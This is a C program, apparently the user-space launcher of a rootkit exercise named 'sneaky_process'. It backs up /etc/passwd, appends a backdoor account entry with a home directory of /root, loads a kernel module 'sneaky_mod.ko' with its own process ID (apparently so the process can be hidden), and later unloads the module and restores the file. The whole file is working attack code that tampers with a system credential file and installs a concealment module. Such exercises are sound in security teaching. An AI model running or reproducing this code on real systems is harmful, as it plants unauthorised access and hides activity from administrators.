#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#define DEBUG 0 // 1 to print debug info
#define SOURCEFILE "/etc/passwd"
#define TARGETFILE "/tmp/passwd"

void copyFile(const char *src, const char *trg);

void updateFile();

void loadModule();

void unloadModule();

int main(int argc, char **argv) {
  // Attack 1: print own process ID
  printf("sneaky_process pid = %d\n", getpid());

  // Attack 2: step 1 - copy from source to target
  copyFile(SOURCEFILE, TARGETFILE);

  if (DEBUG)
    printf("File copied successfully.\n");

  // Attack 2: step 2 - update source file
  updateFile();

  if (DEBUG)
    printf("Update file successfully...\n");

  // Attack 3: get process ID, load sneaky_mod.ko and pass PID
  loadModule();

  if (DEBUG)
    printf("Sneaky_mod loaded successfully.\n");

  // Attack 4: enter waiting loop, fork child process
  while (1) {
    char ch = getchar();
    if (ch == 'q') {
      break;
    }
  }

  // finish step 1: rmmod
  unloadModule();

  if (DEBUG) printf("Module unload successfully.\n");

  // finish step 2: restore /etc/passwd
  copyFile(TARGETFILE, SOURCEFILE);

  if (DEBUG) printf("File copied back successfully.\n");

  return 0;
}

void copyFile(const char *src, const char *trg) {
  FILE *source, *target;
  source = fopen(src, "r");
  if (source == NULL) {
    printf("Cannot open source file...\n");
    exit(EXIT_FAILURE);
  }

  target = fopen(trg, "w");
  if (target == NULL) {
    fclose(source);
    printf("Cannot open target file...\n");
    exit(EXIT_FAILURE);
  }

  char ch;
  while ((ch = fgetc(source)) != EOF) {
    fputc(ch, target);
  }

  fclose(source);
  fclose(target);
}

void updateFile() {
  FILE *update;
  update = fopen(SOURCEFILE, "a");
  if (update == NULL) {
    printf("Cannot open update file...\n");
    exit(EXIT_FAILURE);
  }

  char newline[] = "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n";
  int pos = 0;
  while (newline[pos] != '\0') {
    fputc(newline[pos], update);
    pos++;
  }

  fclose(update);
}

void loadModule() {
  pid_t mypid;
  mypid = fork();

  if (mypid < 0) {
    printf("Error in fork...\n");
    exit(EXIT_FAILURE);
  } else if (mypid > 0) { // parent wait for child
    pid_t wpid = waitpid(mypid, NULL, 0);
    if (wpid < 0) {
      printf("Error in waiting pid...\n");
      exit(EXIT_FAILURE);
    }
  } else { // child do his own thang
    char args[50];
    long ppid = getppid(); // need parent pid
    sprintf(args, "pid=%ld", ppid);

    if (execl("/sbin/insmod", "insmod", "sneaky_mod.ko", args, (char *)NULL) <
        0) {
      printf("Error in loading module...\n");
      exit(EXIT_FAILURE);
    }
  }
}

void unloadModule() {
  pid_t mypid = fork();
  if (mypid < 0) {
    printf("Error unloadmodule...\n");
    exit(EXIT_FAILURE);
  } else if (mypid > 0) { // parent wait
    pid_t wpid = waitpid(mypid, NULL, 0);

    if (wpid < 0) {
      printf("Error in waitpid...\n");
      exit(EXIT_FAILURE);
    }
  } else { // child do his own thang
    if (execl("/sbin/rmmod", "rmmod", "sneaky_mod.ko", (char *)NULL) < 0) {
      printf("Error unload module...\n");
      exit(EXIT_FAILURE);
    }
  }
}
